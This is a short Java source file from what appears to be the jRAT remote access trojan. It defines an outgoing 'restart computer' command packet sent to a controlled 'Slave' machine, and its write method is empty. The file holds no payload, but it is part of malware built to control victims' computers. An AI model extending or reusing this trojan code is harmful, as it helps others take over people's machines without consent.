package pro.jrat.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.Slave;

public class Packet29RestartComputer extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {

	}

	@Override
	public byte getPacketId() {
		return 29;
	}

}
